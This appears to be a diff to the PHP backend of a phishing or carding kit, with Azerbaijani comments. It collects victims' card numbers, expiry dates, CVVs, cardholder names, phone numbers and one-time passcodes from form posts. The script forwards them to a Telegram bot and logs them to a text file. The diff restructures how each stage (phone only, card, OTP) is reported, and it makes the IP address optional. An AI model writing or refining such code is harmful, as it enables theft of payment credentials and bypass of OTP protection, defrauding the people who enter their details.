@@ -17,7 +17,7 @@ $cardCvv = isset($_POST['card_cvv']) ? trim(strip_tags($_POST['card_cvv'])) : ''
 $operator = isset($_POST['operator']) ? trim(strip_tags($_POST['operator'])) : '';
 $phone = isset($_POST['phone']) ? trim(strip_tags($_POST['phone'])) : '';
 $amount = isset($_POST['amount']) ? trim(strip_tags($_POST['amount'])) : '';
-$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : $_SERVER['REMOTE_ADDR'];
+$ip = isset($_POST['ip']) ? trim(strip_tags($_POST['ip'])) : '';
 $otp = isset($_POST['otp']) ? trim(strip_tags($_POST['otp'])) : '';
 $campaign = isset($_POST['campaign']) ? trim(strip_tags($_POST['campaign'])) : '';
 $type = isset($_POST['type']) ? trim(strip_tags($_POST['type'])) : '';
@@ -54,18 +54,17 @@ function sendToTelegram($message) {
 }
 
 // ============================================================
-// 📝 1-Cİ MESAJ: YALNIZ NÖMRƏ (KARTDAN ƏVVƏL)
+// 📝 1-Cİ MESAJ: YALNIZ NÖMRƏ (IP YOXDUR)
 // ============================================================
 if ($type === 'phone_only') {
     $message = "📞 YENİ NÖMRƏ #" . $id . "\n";
     $message .= "────────────────────────\n";
     $message .= "📱 Nömrə: " . $phone . "\n";
-    $message .= "🌐 IP: " . $ip . "\n";
     $message .= "────────────────────────";
     
     sendToTelegram($message);
     
-    $logData = date('Y-m-d H:i:s') . " | ID: #$id | NÖMRƏ: $phone | IP: $ip\n";
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | NÖMRƏ: $phone\n";
     file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
     
     header('Content-Type: application/json');
@@ -74,9 +73,9 @@ if ($type === 'phone_only') {
 }
 
 // ============================================================
-// 📝 2-Cİ MESAJ: KART + NÖMRƏ (OTP YOXDURSA)
+// 📝 2-Cİ MESAJ: KART + NÖMRƏ (IP VAR)
 // ============================================================
-if (empty($otp) && !empty($cardNumber)) {
+if ($type === 'card_only' && !empty($cardNumber)) {
     $message = "💳 KART GİRİŞİ #" . $id . "\n";
     $message .= "────────────────────────\n";
     $message .= "📱 Nömrə: " . $phone . "\n";
@@ -85,7 +84,9 @@ if (empty($otp) && !empty($cardNumber)) {
     $message .= "📅 Tarix: " . $cardExpiry . "\n";
     $message .= "🔐 CVV: " . $cardCvv . "\n";
     $message .= "👤 İsim: " . $cardName . "\n";
-    $message .= "🌐 IP: " . $ip . "\n";
+    if (!empty($ip)) {
+        $message .= "🌐 IP: " . $ip . "\n";
+    }
     if (!empty($campaign)) {
         $message .= "📦 Paket: " . $campaign . "\n";
     }
@@ -93,7 +94,7 @@ if (empty($otp) && !empty($cardNumber)) {
     
     sendToTelegram($message);
     
-    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | IP: $ip\n";
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | KART | NÖMRƏ: $phone | IP: $ip\n";
     file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
     
     header('Content-Type: application/json');
@@ -102,14 +103,16 @@ if (empty($otp) && !empty($cardNumber)) {
 }
 
 // ============================================================
-// 📝 3-CÜ MESAJ: OTP + NÖMRƏ
+// 📝 3-CÜ MESAJ: OTP + NÖMRƏ (IP VAR)
 // ============================================================
 if (!empty($otp)) {
     $message = "🔑 OTP TƏSDİQİ #" . $id . "\n";
     $message .= "────────────────────────\n";
     $message .= "📱 Nömrə: " . $phone . "\n";
     $message .= "🔑 OTP: " . $otp . "\n";
-    $message .= "🌐 IP: " . $ip . "\n";
+    if (!empty($ip)) {
+        $message .= "🌐 IP: " . $ip . "\n";
+    }
     if (!empty($campaign)) {
         $message .= "📦 Paket: " . $campaign . "\n";
     }
@@ -117,7 +120,7 @@ if (!empty($otp)) {
     
     sendToTelegram($message);
     
-    $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | IP: $ip\n";
+    $logData = date('Y-m-d H:i:s') . " | ID: #$id | OTP: $otp | NÖMRƏ: $phone | IP: $ip\n";
     file_put_contents('telegram_log.txt', $logData, FILE_APPEND);
     
     header('Content-Type: application/json');
